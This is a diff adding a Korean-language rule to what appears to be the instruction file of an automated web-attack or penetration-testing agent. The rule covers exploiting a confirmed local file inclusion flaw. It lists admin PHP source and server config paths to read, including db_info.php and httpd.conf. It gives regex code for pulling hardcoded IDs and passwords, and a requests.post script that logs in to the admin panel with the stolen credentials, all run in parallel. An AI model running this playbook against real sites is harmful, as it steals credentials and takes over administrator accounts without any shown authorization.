@@ -2910,6 +2910,70 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
           else:
               print(f"    {param}: 크기차이 0B (반응 없음)")
 
+  ── RULE 26-AL [v3.2.37]: LFI 확인 후 admin 패널 PHP 소스 강제 읽기 + 로그인 검증 ──
+
+  ▸ RULE 26-AL [v3.2.37]: LFI(임의 파일 읽기)가 확인된 즉시 아래 단계를 반드시 병렬로 실행한다.
+    이 규칙은 다른 DB 덤프, 사용자 열거보다 우선순위가 높다.
+
+  [STEP 1] admin 로그인 PHP 소스 읽기 — DocumentRoot 기반 경로 사용
+    우선 후보 경로 (병렬 시도):
+      {DOC_ROOT}/admin/login/login_proc.php
+      {DOC_ROOT}/admin/login/login.php
+      {DOC_ROOT}/admin/login/login_ok.php
+      {DOC_ROOT}/admin/common/member_list.php
+      {DOC_ROOT}/admin/index.php
+      {DOC_ROOT}/include/db_info.php  ← 이미 읽었어도 재확인
+    DocumentRoot 모를 경우: LFI로 먼저 /etc/httpd/conf/httpd.conf 읽어 DocumentRoot 확인
+
+  [STEP 2] 읽은 소스에서 크리덴셜 추출
+    추출 대상:
+      a) PHP 파일에 하드코딩된 user_id/user_pw, admin_id/admin_pw, id/pw 변수
+      b) DB 연결에 사용된 호스트/유저/패스워드/DB명
+      c) $admin_list 또는 $accounts 배열에 정의된 계정
+    추출 코드 예:
+      patterns = [
+          r"['\"]user_id['\"]\s*=>\s*['\"]([^'\"]+)['\"]",
+          r"['\"]user_pw['\"]\s*=>\s*['\"]([^'\"]+)['\"]",
+          r"\$id\s*=\s*['\"]([^'\"]+)['\"]",
+          r"\$pw\s*=\s*['\"]([^'\"]+)['\"]",
+          r"user_id\s*==\s*['\"]([^'\"]+)['\"]",
+          r"user_pw\s*==\s*['\"]([^'\"]+)['\"]",
+      ]
+
+  [STEP 3] 발견된 크리덴셜로 즉시 로그인 시도
+    로그인 성공 판별 기준 (아래 중 하나):
+      ✅ HTTP 302 + Location 헤더가 /admin/ 하위 경로
+      ✅ 응답 쿠키에 세션 ID 발급 (Set-Cookie)
+      ✅ 응답 본문에 로그인 성공 키워드 (환영 문구, 관리자 메뉴 HTML)
+    실패 판별:
+      ❌ 302 → /admin/login/ (로그인 페이지로 되돌아감)
+      ❌ 응답 본문에 로그인 실패 키워드 (비밀번호 오류, 아이디 없음 등)
+
+    로그인 시도 예:
+      r = requests.post(
+          f"{base_url}/admin/login/login_proc.php",
+          data={"user_id": uid, "user_pw": pw},
+          verify=False, allow_redirects=False, timeout=10
+      )
+      if r.status_code in (301, 302):
+          loc = r.headers.get("Location", "")
+          if "/admin/login" not in loc:
+              print(f"✅ 관리자 로그인 성공: {uid}/{pw} → {loc}")
+          else:
+              print(f"❌ 로그인 실패(로그인 페이지로 리다이렉트): {uid}/{pw}")
+      else:
+          print(f"❌ 로그인 실패(상태코드 {r.status_code}): {uid}/{pw}")
+
+  [STEP 4] 검증된 크리덴셜만 보고서에 기록
+    WRONG — 로그인 테스트 없이 DB에서 찾은 계정을 바로 보고서에 기재
+    CORRECT — 반드시 302 리다이렉트 또는 세션 쿠키 확인 후에만 "관리자 패널 계정 확인" 으로 기록
+    DB 테이블(예: HS_ADMIN)에서 가져온 계정도 반드시 실제 로그인 테스트를 통과해야 보고서에 기재
+
+  [STEP 5] 시간 최소화 — 병렬 실행 필수
+    위 STEP 1~3 을 단일 스크립트 내 ThreadPoolExecutor 또는 병렬 섹션으로 실행
+    LFI 없는 타겟: STEP 1 에서 모든 경로가 0B 또는 403 반환 시 → 자동으로 건너뜀
+    추가 루프 증가 없이 기존 루프 내 병렬 섹션으로 처리
+
   ── 27. SQLi Extraction & Oracle Quality ──
 
   ▸ RULE 27-A: EXTRACTVALUE / UPDATEXML result extraction — use the MySQL error format.
